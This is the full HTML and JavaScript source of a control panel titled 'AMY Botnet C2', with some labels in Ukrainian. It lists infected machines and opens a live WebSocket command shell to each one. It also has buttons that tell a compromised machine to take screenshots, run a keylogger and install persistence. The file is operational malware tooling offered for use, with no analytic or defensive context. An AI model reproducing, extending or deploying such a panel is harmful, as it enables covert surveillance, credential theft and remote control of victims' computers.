<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <title>AMY Botnet C2</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .terminal { 
            background:#0a0a0a; 
            font-family:monospace; 
            color:#00ff41; 
            height:480px; 
            overflow-y:auto; 
            padding:15px; 
            border:1px solid #450a0a; 
        }
        .bot-active { background:#450a0a; border-left:4px solid #ef4444; }
        .status-box { background:#1f2937; border:1px solid #ef4444; }

        button {
            color: white !important;
            font-weight: 700 !important;
            text-shadow: 0 0 1px rgba(0,0,0,0.8);
        }
        button:hover {
            filter: brightness(1.15);
        }
    </style>
</head>
<body class="bg-zinc-950 text-red-400 p-8">
    <h1 class="text-5xl font-bold mb-6 text-red-600">AMY BOTNET C2</h1>

    <div class="grid grid-cols-12 gap-6">
        <div class="col-span-3">
            <h2 class="text-xl mb-3">Active Bots (<span id="count" class="text-red-500">0</span>)</h2>
            <div id="botlist" class="space-y-2"></div>
        </div>

        <div class="col-span-9">
            <!-- Статус бота -->
            <div class="status-box p-4 mb-4 rounded flex items-center">
                <span class="text-red-500 font-bold mr-3">СТАТУС БОТА:</span> 
                <span id="selected-bot" class="text-white font-mono text-lg">— none selected —</span>
            </div>

            <div class="flex gap-4 mb-4">
                <button onclick="takeScreenshot()" class="bg-orange-600 hover:bg-orange-700 px-6 py-3.5 rounded flex-1">📸 Screenshot</button>
                <button onclick="toggleKeylogger()" class="bg-purple-600 hover:bg-purple-700 px-6 py-3.5 rounded flex-1">⌨️ Keylogger</button>
                <button onclick="addPersistence()" class="bg-amber-600 hover:bg-amber-700 px-6 py-3.5 rounded flex-1">🔒 Persistence</button>
            </div>

            <div class="terminal" id="terminal">Terminal ready...</div>
            
            <div class="flex mt-3 gap-3">
                <input id="cmd" class="flex-1 bg-zinc-900 border border-red-900 p-4 rounded text-white placeholder-zinc-500" 
                       placeholder="whoami або shell:dir" onkeypress="if(event.key==='Enter') sendCommand()">
                <button onclick="sendCommand()" class="bg-red-600 hover:bg-red-700 px-12 rounded font-bold">SEND</button>
            </div>
        </div>
    </div>

    <script>
        let currentBot = null;
        let terminalWs = null;

        async function updateBots() {
            const res = await fetch('/bots');
            const data = await res.json();
            document.getElementById('count').textContent = data.bots.length;

            let html = '';
            data.bots.forEach(bot => {
                html += `<div onclick="selectBot('${bot}')" class="p-3 rounded cursor-pointer hover:bg-zinc-800 ${currentBot === bot ? 'bot-active' : ''}">${bot}</div>`;
            });
            document.getElementById('botlist').innerHTML = html || '<div class="text-zinc-500 p-3">No bots connected</div>';
        }

        function selectBot(bot) {
            currentBot = bot;
            document.getElementById('selected-bot').textContent = bot;
            updateBots();
            
            if (terminalWs) terminalWs.close();
            terminalWs = new WebSocket(`ws://${location.host}/terminal/${currentBot}`);
            terminalWs.onmessage = (e) => {
                const term = document.getElementById('terminal');
                term.innerHTML += '<br>> ' + e.data;
                term.scrollTop = term.scrollHeight;
            };
        }

        function sendCommand() {
            const cmd = document.getElementById('cmd').value.trim();
            if (!currentBot || !cmd || !terminalWs) return;
            terminalWs.send(cmd);
            document.getElementById('cmd').value = '';
        }

        function takeScreenshot() { if (currentBot) fetch(`/screenshot/${currentBot}`); }
        function toggleKeylogger() { if (currentBot) fetch(`/keylogger/${currentBot}`); }
        function addPersistence() { if (currentBot) fetch(`/persistence/${currentBot}`); }

        setInterval(updateBots, 2500);
        updateBots();
    </script>
</body>
</html>
